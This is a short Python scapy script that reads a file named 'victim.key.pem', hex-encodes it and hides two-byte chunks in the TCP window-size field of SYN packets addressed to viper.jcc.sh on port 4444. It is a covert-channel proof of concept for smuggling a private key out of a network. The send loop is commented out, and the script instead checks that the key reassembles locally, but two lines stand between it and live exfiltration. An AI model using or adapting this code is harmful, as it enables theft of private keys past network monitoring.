#!/usr/bin/env python3
from scapy.all import *
from common import *


if __name__ == "__main__":
    with open("victim.key.pem", "r") as f:
        victim_key = f.read()

    # Serialize into hex
    hex_string = ser_data(victim_key)

    # Chunk it into two-byte chunks
    # TCP receive window size field is two bytes in length
    chunks = chunk(hex_string)

    # Create custom SYN packets
    packets = []
    for chunk in chunks:
        window_size = int(chunk, 16)
        p = IP(dst="viper.jcc.sh") / TCP(dport=4444, window=window_size)
        packets.append(p)

    # for p in packets:
    # send(p)
    # for p in packets:
    # print(p.window, str(format(p.window, "04x")))

    reconstructed_hex_string = reconstruct_hex_string(packets)

    # # print(reconstructed_hex_string)
    assert hex_string == reconstructed_hex_string
    reconstructed_victim_key = deser_data(reconstructed_hex_string)
    print(reconstructed_victim_key)

    # print(reconstructed_victim_key)
    print()
